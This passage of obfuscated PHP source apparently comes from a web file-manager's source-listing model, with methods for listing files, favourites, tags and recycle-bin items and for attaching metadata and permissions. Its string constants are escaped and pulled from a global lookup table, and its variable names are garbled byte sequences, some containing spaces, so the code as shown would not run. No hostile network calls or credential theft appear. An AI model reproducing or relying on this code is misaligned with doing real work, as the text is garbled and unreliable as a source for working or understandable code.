Cache::set($this->cacheKey($ŒªÑíøû), $ÙÏúÆùÎ); } public function cacheGet($÷‡¨‡Îş) { return Cache::get($this->cacheKey($÷‡¨‡Îş)); } public function cacheRemove($‹‹ëœß­) { return Cache::remove($this->cacheKey($‹‹ëœß­)); } protected function filterWhere($íÀµÜÒ) { return $íÀµÜÒ; } protected function cacheKey($øŒÇè˜Ş) { return $øŒÇè˜Ş; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\162\143\x65"; protected $tableMeta = array("\164\141\142\154\145\x4e\x61\x6d\x65" => "\151\157\137\x73\157\x75\162\143\145\x5f\155\x65\164\141", "\x6d\145\x74\x61\x46\151\x65\154\144" => "\x73\157\x75\x72\143\x65\x49\104"); protected $dataAuto = array(array("\155\x6f\144\151\x66\x79\124\x69\155\x65", "\x74\151\x6d\x65", "\151\x6e\163\x65\x72\164", "\x66\x75\x6e\143\x74\x69\x6f\156"), array("\143\x72\x65\141\164\x65\124\x69\155\145", "\164\x69\x6d\x65", "\x69\x6e\x73\x65\162\x74", "\x66\165\156\x63\x74\x69\x6f\156"), array("\166\x69\x65\167\124\151\155\145", "\164\x69\155\145", "\x69\x6e\163\145\162\x74", "\146\x75\156\143\164\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ü©¤²ò) { return $this->listSource(array($_SERVER[¡¬ıÜ ƒ][479] => $ü©¤²ò)); } public function typeName($éãŠñÙâ) { static $ŠùÇú—æ = array(self::TYPE_SYSTEM => "\163\171\x73\x74\x65\155", self::TYPE_USER => "\165\163\x65\162", self::TYPE_GROUP => "\x67\162\x6f\165\160"); return $ŠùÇú—æ[$éãŠñÙâ . $_SERVER[¡¬ıÜ ƒ][12]]; } public function sourceListInfo($İº„çîÒ, $Ñ¥Â›ƒ = false) { $¢¢™¶Îì =& $_SERVER[¡¬ıÜ ƒ]; $İº„çîÒ = $İº„çîÒ ? $İº„çîÒ : array(); $İº„çîÒ = array_filter(array_unique($İº„çîÒ)); if (!$İº„çîÒ) { return array(); } $ˆàÜÃ¶ = $this->where(array($¢¢™¶Îì[193] => array($¢¢™¶Îì[7], $İº„çîÒ)))->select(); $this->_listDataApply($ˆàÜÃ¶, $Ñ¥Â›ƒ); return array_to_keyvalue($ˆàÜÃ¶, $¢¢™¶Îì[193]); } public function pathInfoFilter(&$“öÖöĞù) { $—ëŠñÂ½ =& $_SERVER[¡¬ıÜ ƒ]; static $¢ª¦˜Ì = false; static $ˆõÑÉÖå = false; static $›Ò¬ô = false; if (!$¢ª¦˜Ì) { $¶”éùİÑ = $—ëŠñÂ½[480]; $¶”éùİÑ .= $—ëŠñÂ½[481]; $¶”éùİÑ .= $—ëŠñÂ½[482]; $©ƒí­ìã = $—ëŠñÂ½[483]; $À„®£´« = explode($—ëŠñÂ½[50], $©ƒí­ìã); $¢ª¦˜Ì = explode($—ëŠñÂ½[50], $¶”éùİÑ); $ˆõÑÉÖå = array(); foreach ($¢ª¦˜Ì as $¸‰°êì) { if (in_array($¸‰°êì, $À„®£´«)) { continue; } $ˆõÑÉÖå[] = $¸‰°êì; } $›Ò¬ô = explode($—ëŠñÂ½[50], $—ëŠñÂ½[484]); } foreach ($›Ò¬ô as $ÀÉ’®ò) { if (isset($“öÖöĞù[$ÀÉ’®ò])) { $“öÖöĞù[$ÀÉ’®ò] = intval($“öÖöĞù[$ÀÉ’®ò]); } } $“öÖöĞù[$—ëŠñÂ½[87]] = $—ëŠñÂ½[485] . $“öÖöĞù[$—ëŠñÂ½[193]] . $—ëŠñÂ½[486]; $“öÖöĞù[$—ëŠñÂ½[33]] = $“öÖöĞù[$—ëŠñÂ½[487]] == 1 ? $—ëŠñÂ½[78] : $—ëŠñÂ½[232]; $“öÖöĞù[$—ëŠñÂ½[190]] = $this->typeName($“öÖöĞù[$—ëŠñÂ½[190]]); if ($“öÖöĞù[$—ëŠñÂ½[487]] != 1) { $“öÖöĞù[$—ëŠñÂ½[169]] = $“öÖöĞù[$—ëŠñÂ½[488]]; unset($“öÖöĞù[$—ëŠñÂ½[488]]); } $Š½†ú¬… = $¢ª¦˜Ì; if (isset($“öÖöĞù[$—ëŠñÂ½[489]]) && $“öÖöĞù[$—ëŠñÂ½[489]][$—ëŠñÂ½[490]] == -1) { $Š½†ú¬… = $ˆõÑÉÖå; } $“öÖöĞù = array_field_key($“öÖöĞù, $Š½†ú¬…); return $“öÖöĞù; } public function listUserFav() { $Ë®†Ğ„ =& $_SERVER[¡¬ıÜ ƒ]; $ĞÊ„ä‰ = Model($Ë®†Ğ„[491])->listData(); $İû ¥³¥ = array_filter_by_field($ĞÊ„ä‰, $Ë®†Ğ„[33], $Ë®†Ğ„[492]); $İû ¥³¥ = array_to_keyvalue($İû ¥³¥, $Ë®†Ğ„[12], $Ë®†Ğ„[87]); if ($İû ¥³¥) { $„¤·¦ÏŸ = $this->listSource(array($Ë®†Ğ„[493] => array($Ë®†Ğ„[494], $İû ¥³¥))); } $„¤·¦ÏŸ = array_to_keyvalue($„¤·¦ÏŸ[$Ë®†Ğ„[447]], $Ë®†Ğ„[193]); foreach ($ĞÊ„ä‰ as &$Š½È¢Ú¢) { $Š½È¢Ú¢ = array($Ë®†Ğ„[495] => $Š½È¢Ú¢[$Ë®†Ğ„[477]], $Ë®†Ğ„[496] => $Š½È¢Ú¢[$Ë®†Ğ„[32]], $Ë®†Ğ„[497] => $Š½È¢Ú¢[$Ë®†Ğ„[87]], $Ë®†Ğ„[498] => $Š½È¢Ú¢[$Ë®†Ğ„[33]], $Ë®†Ğ„[499] => $Š½È¢Ú¢[$Ë®†Ğ„[233]], $Ë®†Ğ„[500] => $Š½È¢Ú¢[$Ë®†Ğ„[88]]); if ($Š½È¢Ú¢[$Ë®†Ğ„[33]] == $Ë®†Ğ„[492] && $„¤·¦ÏŸ[$Š½È¢Ú¢[$Ë®†Ğ„[87]]]) { $Š½È¢Ú¢[$Ë®†Ğ„[90]] = $„¤·¦ÏŸ[$Š½È¢Ú¢[$Ë®†Ğ„[87]]]; } } unset($Š½È¢Ú¢); return $ĞÊ„ä‰; } public function listUserTag($ø«²õæŸ) { $å’‰±Ïø =& $_SERVER[¡¬ıÜ ƒ]; if ($ø«²õæŸ && !is_array($ø«²õæŸ)) { $ø«²õæŸ = array($ø«²õæŸ); } $ƒùÔÊ¾ = Model($å’‰±Ïø[501])->listData(); $ƒöç©ñš = array(); $şÊïŸ’¶ = array(); foreach ($ƒùÔÊ¾ as $Ç¡’¾) { $ åÂü¬è = $Ç¡’¾[$å’‰±Ïø[87]]; if (!$ åÂü¬è) { continue; } if (!isset($şÊïŸ’¶[$ åÂü¬è])) { $şÊïŸ’¶[$ åÂü¬è] = array(); } $şÊïŸ’¶[$ åÂü¬è][] = $Ç¡’¾[$å’‰±Ïø[502]]; $ƒöç©ñš[$Ç¡’¾[$å’‰±Ïø[87]]] = $Ç¡’¾; } $Î‡§ ¢İ = array(); $ƒà±°Ó‹ = array(); $¨ûšşø­ = array(); foreach ($şÊïŸ’¶ as $‹çØµÕ => $şıºô…) { $‘¸½ = !0; if (!$ø«²õæŸ) { $Î‡§ ¢İ[] = $‹çØµÕ; continue; } foreach ($ø«²õæŸ as $Á†•õ±›) { if (!in_array($Á†•õ±›, $şıºô…)) { $‘¸½ = !1; break; } } if (!$‘¸½) { continue; } if (!is_numeric($‹çØµÕ)) { $îéÅÀ¨’ = $ƒöç©ñš[$‹çØµÕ]; $çáæ×£ñ = array($å’‰±Ïø[32] => $îéÅÀ¨’[$å’‰±Ïø[32]], $å’‰±Ïø[87] => $îéÅÀ¨’[$å’‰±Ïø[87]], $å’‰±Ïø[33] => $îéÅÀ¨’[$å’‰±Ïø[33]], $å’‰±Ïø[90] => array($å’‰±Ïø[503] => 1), $å’‰±Ïø[234] => !0); if ($îéÅÀ¨’[$å’‰±Ïø[33]] == $å’‰±Ïø[232]) { $¨ûšşø­[] = $çáæ×£ñ; } if ($îéÅÀ¨’[$å’‰±Ïø[33]] == $å’‰±Ïø[78]) { $ƒà±°Ó‹[] = $çáæ×£ñ; } continue; } $Î‡§ ¢İ[] = $‹çØµÕ; } if ($Î‡§ ¢İ) { $ÏŸÖÁ‰¿ = $this->listSource(array($å’‰±Ïø[493] => array($å’‰±Ïø[494], $Î‡§ ¢İ))); } $ÏŸÖÁ‰¿ = $ÏŸÖÁ‰¿ ? $ÏŸÖÁ‰¿ : array($å’‰±Ïø[85] => array(), $å’‰±Ïø[86] => array()); $ÏŸÖÁ‰¿[$å’‰±Ïø[85]] = array_merge($ÏŸÖÁ‰¿[$å’‰±Ïø[85]], $ƒà±°Ó‹); $ÏŸÖÁ‰¿[$å’‰±Ïø[86]] = array_merge($ÏŸÖÁ‰¿[$å’‰±Ïø[86]], $¨ûšşø­); if (isset($ÏŸÖÁ‰¿[$å’‰±Ïø[444]]) && count($Î‡§ ¢İ) == $ÏŸÖÁ‰¿[$å’‰±Ïø[444]][$å’‰±Ïø[445]]) { return $ÏŸÖÁ‰¿; } $‘†şËİü = array(); $†ÄˆåØ = array_to_keyvalue($ÏŸÖÁ‰¿[$å’‰±Ïø[85]], $å’‰±Ïø[12], $å’‰±Ïø[193]); $‹«ğüì = array_to_keyvalue($ÏŸÖÁ‰¿[$å’‰±Ïø[86]], $å’‰±Ïø[12], $å’‰±Ïø[193]); $¬ˆôÒ˜ = array_merge($‹«ğüì, $†ÄˆåØ); foreach ($Î‡§ ¢İ as $ åÂü¬è) { if (!in_array($ åÂü¬è, $¬ˆôÒ˜)) { $‘†şËİü[] = $ åÂü¬è; } } if ($‘†şËİü) { Model($å’‰±Ïø[504])->removeBySource($‘†şËİü); } return $ÏŸÖÁ‰¿; } public function listUserRecycle() { $ìËú¡Ş =& $_SERVER[¡¬ıÜ ƒ]; $®²ù½– = Model($ìËú¡Ş[505])->listData(); if (!$®²ù½–) { return array(); } $€ÚëŠ¹Ò = array($ìËú¡Ş[493] => array($ìËú¡Ş[494], $®²ù½–), $ìËú¡Ş[506] => 1); return $this->listSource($€ÚëŠ¹Ò); } public function listSource($æÀ Ï”, $È“Ş€çÖ = 3000, $è¡î¹ÉÆ = false) { $ñƒºà„É =& $_SERVER[¡¬ıÜ ƒ]; if (!isset($æÀ Ï”[$ñƒºà„É[507]])) { $æÀ Ï”[$ñƒºà„É[507]] = 0; } if (isset($æÀ Ï”[$ñƒºà„É[192]]) && $æÀ Ï”[$ñƒºà„É[192]] == $ñƒºà„É[230]) { $æÀ Ï”[$ñƒºà„É[488]] = array($ñƒºà„É[508], $ñƒºà„É[12]); } $ˆÚÊ´åó = $ñƒºà„É[509]; $Ùœ•Áò¹ = $this->field($ˆÚÊ´åó)->_makeOrder()->where($æÀ Ï”)->selectPage($È“Ş€çÖ); $this->_listPageCheck($Ùœ•Áò¹, $ˆÚÊ´åó, $æÀ Ï”); $this->_listDataApply($Ùœ•Áò¹[$ñƒºà„É[447]], $è¡î¹ÉÆ); $this->_listMake($Ùœ•Áò¹); return $Ùœ•Áò¹; } private function _listPageCheck(&$ÇÇ­ØÙĞ, $ô¢¶º´¡, $ØŠÄÌÖ±) { $¿¬ü¶¯Ô =& $_SERVER[¡¬ıÜ ƒ]; if (!is_array($ÇÇ­ØÙĞ[$¿¬ü¶¯Ô[444]])) { return; } $¶¾§æ¥Û = $ÇÇ­ØÙĞ[$¿¬ü¶¯Ô[444]]; if ($¶¾§æ¥Û[$¿¬ü¶¯Ô[446]] <= 1) { return; } if ($¶¾§æ¥Û[$¿¬ü¶¯Ô[445]] >= 100000) { return; } if (Model($¿¬ü¶¯Ô[510])->get($¿¬ü¶¯Ô[511]) != $¿¬ü¶¯Ô[512]) { return; } $ô¢¶º´¡ = str_replace(array($¿¬ü¶¯Ô[53], $¿¬ü¶¯Ô[419], $¿¬ü¶¯Ô[287]), $¿¬ü¶¯Ô[12], $ô¢¶º´¡); $ô¢¶º´¡ = $¿¬ü¶¯Ô[513] . str_replace($¿¬ü¶¯Ô[50], $¿¬ü¶¯Ô[514], $ô¢¶º´¡) . $¿¬ü¶¯Ô[515]; $ Ş¡ê€ = $¿¬ü¶¯Ô[516]; $ Ş¡ê€ = $ Ş¡ê€ . $¿¬ü¶¯Ô[517]; $®ìÀÇÆ÷ = $¶¾§æ¥Û[$¿¬ü¶¯Ô[441]] * ($¶¾§æ¥Û[$¿¬ü¶¯Ô[430]] - 1) . $¿¬ü¶¯Ô[50] . $¶¾§æ¥Û[$¿¬ü¶¯Ô[441]]; $¶…ÅÚœÃ = $this->_makeOrder(!0); $úÆ°ñåõ = $¿¬ü¶¯Ô[513] . str_replace($¿¬ü¶¯Ô[50], $¿¬ü¶¯Ô[514], $¶…ÅÚœÃ[0]); if (strpos($úÆ°ñåõ, $¿¬ü¶¯Ô[518])) { $úÆ°ñåõ = str_replace($¿¬ü¶¯Ô[518], $¿¬ü¶¯Ô[519], $úÆ°ñåõ); } else { $úÆ°ñåõ .= $¿¬ü¶¯Ô[520] . $¶…ÅÚœÃ[1]; } $†¾õØ‡ = array(); foreach ($ØŠÄÌÖ± as $‚Ïéšµ => $‘‘§¤òÀ) { $†¾õØ‡[$¿¬ü¶¯Ô[513] . $‚Ïéšµ] = $‘‘§¤òÀ; } $this->alias($¿¬ü¶¯Ô[521])->field($ô¢¶º´¡)->limit($®ìÀÇÆ÷)->order($úÆ°ñåõ); $‡ó»¸ï = $this->join($ Ş¡ê€)->where($†¾õØ‡)->select(); if ($‡ó»¸ï) { $ÇÇ­ØÙĞ[$¿¬ü¶¯Ô[447]] = $‡ó»¸ï; } } protected function _makeOrder($˜Å©™Ñ» = false) { $«ğŠ›Éê =& $_SERVER[¡¬ıÜ ƒ]; $Õ¥Åæ¬Â = Model($«ğŠ›Éê[522])->get($«ğŠ›Éê[523]); $Êì±Üş§ = Model($«ğŠ›Éê[522])->get($«ğŠ›Éê[524]); $š‰´üØÉ = array($«ğŠ›Éê[525] => $«ğŠ›Éê[526], $«ğŠ›Éê[527] => $«ğŠ›Éê[528]); $¬ÓûÈºº = array($«ğŠ›Éê[32] => $«ğŠ›Éê[32], $«ğŠ›Éê[79] => $«ğŠ›Éê[79], $«ğŠ›Éê[169] => $«ğŠ›Éê[488], $«ğŠ›Éê[529] => $«ğŠ›Éê[529], $«ğŠ›Éê[530] => $«ğŠ›Éê[531], $«ğŠ›Éê[233] => $«ğŠ›Éê[233], $«ğŠ›Éê[88] => $«ğŠ›Éê[88]); $©ìŠ÷À² = Input::get($«ğŠ›Éê[532], $«ğŠ›Éê[7], $Õ¥Åæ¬Â, array_keys($¬ÓûÈºº)); $œ¬©îÇ° = Input::get($«ğŠ›Éê[533], $«ğŠ›Éê[7], $Êì±Üş§, array_keys($š‰´üØÉ)); if (!in_array($©ìŠ÷À², array_keys($¬ÓûÈºº))) { $©ìŠ÷À² = $«ğŠ›Éê[32]; } if (!in_array($œ¬©îÇ°, array_keys($š‰´üØÉ))) { $©ìŠ÷À² = $«ğŠ›Éê[525]; } if ($©ìŠ÷À² == $«ğŠ›Éê[32]) { } $¿ÑÉÉÕ = $«ğŠ›Éê[534] . $¬ÓûÈºº[$©ìŠ÷À²] . $«ğŠ›Éê[53] . $š‰´üØÉ[$œ¬©îÇ°]; $¿ÑÉÉÕ = rtrim(trim($¿ÑÉÉÕ), $«ğŠ›Éê[50]); if ($˜Å©™Ñ») { return array($¿ÑÉÉÕ, $š‰´üØÉ[$œ¬©îÇ°]); } return $this->order($¿ÑÉÉÕ); } protected function _listDataApplyItem($²Ò‡ùÕÀ, $ÒÌ¥±Ù¬ = false) { $ö‘àÅ¦ = array($²Ò‡ùÕÀ); $this->_listDataApply($ö‘àÅ¦, $ÒÌ¥±Ù¬); return $ö‘àÅ¦[0]; } protected function _listDataApply(&$¦çÙâˆƒ, $Ä¨©‡ğå = false) { $ß™˜ù¥ =& $_SERVER[¡¬ıÜ ƒ]; if (!$¦çÙâˆƒ) { $¦çÙâˆƒ = array(); return; } $°ø©úİÏ = array_to_keyvalue($¦çÙâˆƒ, $ß™˜ù¥[12], $ß™˜ù¥[193]); $°ø©úİÏ = array_unique($°ø©úİÏ); $this->_listSourceCache($¦çÙâˆƒ); if (!$Ä¨©‡ğå) { $this->_listAppendMeta($¦çÙâˆƒ, $°ø©úİÏ); $this->_listAppendFileMeta($¦çÙâˆƒ, $°ø©úİÏ); $this->_listAppendChildren($¦çÙâˆƒ, $°ø©úİÏ); } $this->_listAppendPath($¦çÙâˆƒ); $this->_listAppendAuth($¦çÙâˆƒ); $this->_listAppendSourceInfo($¦çÙâˆƒ, $°ø©úİÏ); $this->_listAppendUser($¦çÙâˆƒ); $this->_listFilterInfo($¦çÙâˆƒ, $Ä¨©‡ğå); $this->_listAppendAuthSecret($¦çÙâˆƒ); } protected function _listSourceCache($®¾¿§Ÿœ) { $ã†À÷Àå =& $_SERVER[¡¬ıÜ ƒ]; foreach ($®¾¿§Ÿœ as $åèÌò°£) { self::$cacheSourceInfo[$ã†À÷Àå[535] . $åèÌò°£[$ã†À÷Àå[193]]] = $åèÌò°£; } } protected function _listFilterInfo(&$ïµÉåôí, $¨°®­Õ§ = false) { $½Ø¸ÓŒÈ =& $_SERVER[¡¬ıÜ ƒ]; foreach ($ïµÉåôí as &$Í¬¼ñ¢ì) { $Í¬¼ñ¢ì = $this->pathInfoFilter($Í¬¼ñ¢ì); self::$cachePathInfo[$½Ø¸ÓŒÈ[536] . intval($¨°®­Õ§) . $½Ø¸ÓŒÈ[464] . $Í¬¼ñ¢ì[$½Ø¸ÓŒÈ[193]]] = $Í¬¼ñ¢ì; } unset($Í¬¼ñ¢ì); } protected function _listMake(&$Å•óâÒ) { $İÆ¦Š°ì =& $_SERVER[¡¬ıÜ ƒ]; $Å•óâÒ[$İÆ¦Š°ì[85]] = array(); $Å•óâÒ[$İÆ¦Š°ì[86]] = array(); foreach ($Å•óâÒ[$İÆ¦Š°ì[447]] as $ãµÔ·¢Ğ) { $ƒÇ¼‡Á = $ãµÔ·¢Ğ[$İÆ¦Š°ì[487]] == 1 ? $İÆ¦Š°ì[85] : $İÆ¦Š°ì[86]; $Å•óâÒ[$ƒÇ¼‡Á][] = $ãµÔ·¢Ğ; } unset($Å•óâÒ[$İÆ¦Š°ì[447]]); } protected function _listAppendMeta(&$óÁô¾´, $¤È¥™) { $«›¹”ğ— =& $_SERVER[¡¬ıÜ ƒ]; $éÒÉÍñ = array($«›¹”ğ—[493] => array($«›¹”ğ—[494], $¤È¥™)); $ì•ÖÁíï = Model($«›¹”ğ—[537])->field($«›¹”ğ—[538])->where($éÒÉÍñ)->select(); if (!$ì•ÖÁíï) { return; } $²ª´ì¢Ö = array($«›¹”ğ—[539], $«›¹”ğ—[540], $«›¹”ğ—[519]); $™¿øÌ†ì = array(); foreach ($ì•ÖÁíï as $ğ‘Õ×÷) { if (!isset($™¿øÌ†ì[$ğ‘Õ×÷[$«›¹”ğ—[193]]])) { $™¿øÌ†ì[$ğ‘Õ×÷[$«›¹”ğ—[193]]] = array(); } if (in_array($ğ‘Õ×÷[$«›¹”ğ—[97]], $²ª´ì¢Ö)) { continue; } $™¿øÌ†ì[$ğ‘Õ×÷[$«›¹”ğ—[193]]][$ğ‘Õ×÷[$«›¹”ğ—[97]]] = $ğ‘Õ×÷[$«›¹”ğ—[452]]; } foreach ($óÁô¾´ as &$ŞÉêÄ¶) { $ŞÉêÄ¶[$«›¹”ğ—[541]] = !1; if (isset($™¿øÌ†ì[$ŞÉêÄ¶[$«›¹”ğ—[193]]])) { $ŞÉêÄ¶[$«›¹”ğ—[541]] = $™¿øÌ†ì[$ŞÉêÄ¶[$«›¹”ğ—[193]]]; } if ($this->fileIsLock($ŞÉêÄ¶) && $ŞÉêÄ¶[$«›¹”ğ—[489]]) { $§âñ†îò = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ŞÉêÄ¶[$«›¹”ğ—[489]][$«›¹”ğ—[490]] = AuthModel::authDisable($ŞÉêÄ¶[$«›¹”ğ—[489]][$«›¹”ğ—[490]], $§âñ†îò); $ŞÉêÄ¶[$«›¹”ğ—[489]][$«›¹”ğ—[542]][$«›¹”ğ—[489]] = $ŞÉêÄ¶[$«›¹”ğ—[489]][$«›¹”ğ—[490]]; } } unset($ŞÉêÄ¶); } protected function _listAppendFileMeta(&$È¦‘ôÉß, $ËùÕ¨§) { $»„”§™Û =& $_SERVER[¡¬ıÜ ƒ]; $ù”ÓÆœÛ = array_to_keyvalue($È¦‘ôÉß, $»„”§™Û[12], $»„”§™Û[543]); $ù”ÓÆœÛ = array_filter(array_unique($ù”ÓÆœÛ)); if (!$ù”ÓÆœÛ) { return; } $øúÍ‘ûı = array($»„”§™Û[544] => array($»„”§™Û[494], $ù”ÓÆœÛ)); $úÚ‰À±Ü = $»„”§™Û[545]; $„¯œ’Á§ = Model($»„”§™Û[546])->field($úÚ‰À±Ü)->where($øúÍ‘ûı)->select(); $„¯œ’Á§ = array_to_keyvalue($„¯œ’Á§, $»„”§™Û[543]); $‘ş¹ÎÌŠ = Model($»„”§™Û[547])->field($»„”§™Û[548])->where($øúÍ‘ûı)->select(); $‘ş¹ÎÌŠ = $‘ş¹ÎÌŠ ? $‘ş¹ÎÌŠ : array(); $µß­­‚ù = array(); foreach ($‘ş¹ÎÌŠ as $Êà¥‘„Í) { if (!isset($µß­­‚ù[$Êà¥‘„Í[$»„”§™Û[543]]])) { $µß­­‚ù[$Êà¥‘„Í[$»„”§™Û[543]]] = array(); } $µß­­‚ù[$Êà¥‘„Í[$»„”§™Û[543]]][$Êà¥‘„Í[$»„”§™Û[97]]] = $Êà¥‘„Í[$»„”§™Û[452]]; } foreach ($È¦‘ôÉß as &$±òÁ¿Áá) { $õ¿óÎÇ‹ = $±òÁ¿Áá[$»„”§™Û[543]]; if (!$õ¿óÎÇ‹ || !is_array($„¯œ’Á§[$õ¿óÎÇ‹])) { continue; } $Ç×’Äø› = $„¯œ’Á§[$õ¿óÎÇ‹]; $Ç×’Äø›[$»„”§™Û[79]] = $±òÁ¿Áá[$»„”§™Û[79]]; $Ç×’Äø›[$»„”§™Û[32]] = $±òÁ¿Áá[$»„”§™Û[32]]; if (!$Ç×’Äø›[$»„”§™Û[549]]) { Model($»„”§™Û[546])->fileMd5Check($Ç×’Äø›); } if (!isset(self::$cacheFileInfo[$»„”§™Û[550] . $õ¿óÎÇ‹])) { self::$cacheFileInfo[$»„”§™Û[550] . $õ¿óÎÇ‹] = array_merge(array(), $Ç×’Äø›); } unset($„¯œ’Á§[$õ¿óÎÇ‹][$»„”§™Û[87]]); $ÛÈ¬œûæ = isset($µß­­‚ù[$õ¿óÎÇ‹]) && is_array($µß­­‚ù[$õ¿óÎÇ‹]) ? $µß­­‚ù[$õ¿óÎÇ‹] : array(); $±òÁ¿Áá[$»„”§™Û[170]] = array_merge($ÛÈ¬œûæ, $„¯œ’Á§[$õ¿óÎÇ‹]); if (isset($±òÁ¿Áá[$»„”§™Û[170]][$»„”§™Û[184]])) { $±òÁ¿Áá[$»„”§™Û[184]] = json_decode($±òÁ¿Áá[$»„”§™Û[170]][$»„”§™Û[184]], !0); unset($±òÁ¿Áá[$»„”§™Û[170]][$»„”§™Û[184]]); } } unset($±òÁ¿Áá); } protected function _listAppendSourceInfo(&$¬£‘óöÇ, $ûç÷ ) { $çâÂÅ•” =& $_SERVER[¡¬ıÜ ƒ]; $‘ºàË‹ı = Model($çâÂÅ•”[551])->listData(); $Øí¶Ç©­ = Model($çâÂÅ•”[501])->listData(); $—©ğÂ½ş = Model($çâÂÅ•”[491])->listData(); $ÄîÏËï¶ = Model($çâÂÅ•”[552])->listSimple(); $²Ã©¹Õ¦ = array_to_keyvalue($‘ºàË‹ı, $çâÂÅ•”[477]); $§Ÿù©¸Î = array_to_keyvalue_group($Øí¶Ç©­, $çâÂÅ•”[87], $çâÂÅ•”[502]); $İ¬š·êÔ = array_to_keyvalue($—©ğÂ½ş, $çâÂÅ•”[87]); $ŠÏì¯‘¨ = array_to_keyvalue_group($ÄîÏËï¶, $çâÂÅ•”[193]); foreach ($¬£‘óöÇ as &$µ†…ÎøÙ) { $µ†…ÎøÙ[$çâÂÅ•”[90]] = array($çâÂÅ•”[553] => 0, $çâÂÅ•”[554] => 0, $çâÂÅ•”[555] => 0); if (isset($İ¬š·êÔ[$µ†…ÎøÙ[$çâÂÅ•”[193]]])) { $µ†…ÎøÙ[$çâÂÅ•”[90]][$çâÂÅ•”[556]] = 1; $µ†…ÎøÙ[$çâÂÅ•”[90]][$çâÂÅ•”[557]] = $İ¬š·êÔ[$µ†…ÎøÙ[$çâÂÅ•”[193]]][$çâÂÅ•”[32]]; } if ($§Ÿù©¸Î && $²Ã©¹Õ¦ && isset($§Ÿù©¸Î[$µ†…ÎøÙ[$çâÂÅ•”[193]]])) { $µ†…ÎøÙ[$çâÂÅ•”[90]][$çâÂÅ•”[558]] = array(); foreach ($§Ÿù©¸Î[$µ†…ÎøÙ[$çâÂÅ•”[193]]] as $èòÃçÈĞ) { $÷µ°¦Ş¾ = $²Ã©¹Õ¦[$èòÃçÈĞ]; $µ†…ÎøÙ[$çâÂÅ•”[90]][$çâÂÅ•”[558]][] = array($çâÂÅ•”[559] => $÷µ°¦Ş¾[$çâÂÅ•”[477]], $çâÂÅ•”[496] => $÷µ°¦Ş¾[$çâÂÅ•”[32]], $çâÂÅ•”[560] => $÷µ°¦Ş¾[$çâÂÅ•”[561]]); } } if ($ŠÏì¯‘¨ && isset($ŠÏì¯‘¨[$µ†…ÎøÙ[$çâÂÅ•”[193]]])) { $µ†…ÎøÙ[$çâÂÅ•”[90]][$çâÂÅ•”[562]] = array(); foreach ($ŠÏì¯‘¨[$µ†…ÎøÙ[$çâÂÅ•”[193]]] as $å…šÏÕ) { $ò¬„£ = $çâÂÅ•”[563]; if ($å…šÏÕ[$çâÂÅ•”[564]] == $çâÂÅ•”[91]) { $ò¬„£ .= $çâÂÅ•”[565]; } $µ†…ÎøÙ[$çâÂÅ•”[90]][$çâÂÅ•”[562]] = array_field_key($å…šÏÕ, explode($çâÂÅ•”[50], $ò¬„£)); } } } unset($µ†…ÎøÙ); return $¬£‘óöÇ; } protected function _listAppendChildren(&$»‘¯Š¼¢, $ø¤àŒîÍ) { $Åê•Š…ƒ =& $_SERVER[¡¬ıÜ ƒ]; $í’Íùû™ = array(); $›ş“ˆÏ´ = array($Åê•Š…ƒ[241] => 0, $Åê•Š…ƒ[242] => 0); foreach ($»‘¯Š¼¢ as &$”Îå’€) { if (!$”Îå’€[$Åê•Š…ƒ[487]]) { continue; } $í’Íùû™[] = $”Îå’€[$Åê•Š…ƒ[193]]; } unset($”Îå’€); if (!$í’Íùû™) { return; } $à…ºäÛŒ = array($Åê•Š…ƒ[192] => array($Åê•Š…ƒ[7], $í’Íùû™), $Åê•Š…ƒ[507] => 0); $¯åö¶î¦ = array($Åê•Š…ƒ[192], $Åê•Š…ƒ[487], $Åê•Š…ƒ[566] => $Åê•Š…ƒ[567]); $¼şöéï = $this->field($¯åö¶î¦)->where($à…ºäÛŒ)->group($Åê•Š…ƒ[568])->select(); $¢ş¼î° = array(); foreach ($¼şöéï as $›Õ¼˜¦) { $«Õ§ü­‡ = $›Õ¼˜¦[$Åê•Š…ƒ[192]]; $’·¶½ = $›Õ¼˜¦[$Åê•Š…ƒ[487]] == $Åê•Š…ƒ[91] ? $Åê•Š…ƒ[242] : $Åê•Š…ƒ[241]; if (!isset($¢ş¼î°[$«Õ§ü­‡])) { $¢ş¼î°[$«Õ§ü­‡] = array($Åê•Š…ƒ[241] => 0, $Åê•Š…ƒ[242] => 0); } $¢ş¼î°[$«Õ§ü­‡][$’·¶½] += $›Õ¼˜¦[$Åê•Š…ƒ[567]]; } foreach ($»‘¯Š¼¢ as &$”Îå’€) { if (!$”Îå’€[$Åê•Š…ƒ[487]]) { continue; } $±•İÛ = is_array($¢ş¼î°[$”Îå’€[$Åê•Š…ƒ[193]]]) ? $¢ş¼î°[$”Îå’€[$Åê•Š…ƒ[193]]] : $›ş“ˆÏ´; $”Îå’€[$Åê•Š…ƒ[242]] = $±•İÛ[$Åê•Š…ƒ[242]]; $”Îå’€[$Åê•Š…ƒ[241]] = $±•İÛ[$Åê•Š…ƒ[241]]; unset($”Îå’€[$Åê•Š…ƒ[488]]); } unset($”Îå’€); } protected function _listAppendAuth(&$¹±ï½Ó¸) { $­º¬Ä‚ =& $_SERVER[¡¬ıÜ ƒ]; $ÕªĞÌ¨Û = array(); foreach ($¹±ï½Ó¸ as $ûŠ İ³™) { if ($ûŠ İ³™[$­º¬Ä‚[190]] == self::TYPE_GROUP) { $ÕªĞÌ¨Û[] = $ûŠ İ³™[$­º¬Ä‚[193]]; } } if (!$ÕªĞÌ¨Û) { return; } $É¨«îø¶ = array_to_keyvalue($¹±ï½Ó¸, $­º¬Ä‚[193]); $†ˆŠÓ¥Ú = Model($­º¬Ä‚[569])->getSourceList($ÕªĞÌ¨Û, $É¨«îø¶); $¨¢ÅÄ”§ = KodUser::isRoot(); foreach ($¹±ï½Ó¸ as $»ÁÒÊı  => &$ûŠ İ³™) { $ûŠ İ³™[$­º¬Ä‚[489]] = $†ˆŠÓ¥Ú[$ûŠ İ³™[$­º¬Ä‚[193]]]; if (!$ûŠ İ³™[$­º¬Ä‚[489]] && $ûŠ İ³™[$­º¬Ä‚[190]] == self::TYPE_GROUP) { $ûŠ İ³™[$­º¬Ä‚[489]] = Action($­º¬Ä‚[570])->pathGroupAuthMake($ûŠ İ³™[$­º¬Ä‚[571]]); if (!$ûŠ 